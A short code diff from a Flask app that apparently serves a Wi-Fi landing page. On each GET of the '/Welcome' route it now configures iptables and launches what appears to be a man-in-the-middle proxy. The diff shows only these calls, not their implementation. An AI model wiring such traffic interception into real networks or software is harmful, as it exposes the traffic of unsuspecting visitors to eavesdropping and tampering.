@@ -11,6 +11,7 @@ controller = Blueprint('/Goldigger', __name__, url_prefix = '/Goldigger')
 @controller.route('/Welcome', methods = ['GET','POST'])
 def welcome():
     if request.method == 'GET':
+        models.configure_iptables()
         load_mitm.ProxyMaster.run()
         return render_template('wifi_m/landing_page/index.html')
     else:
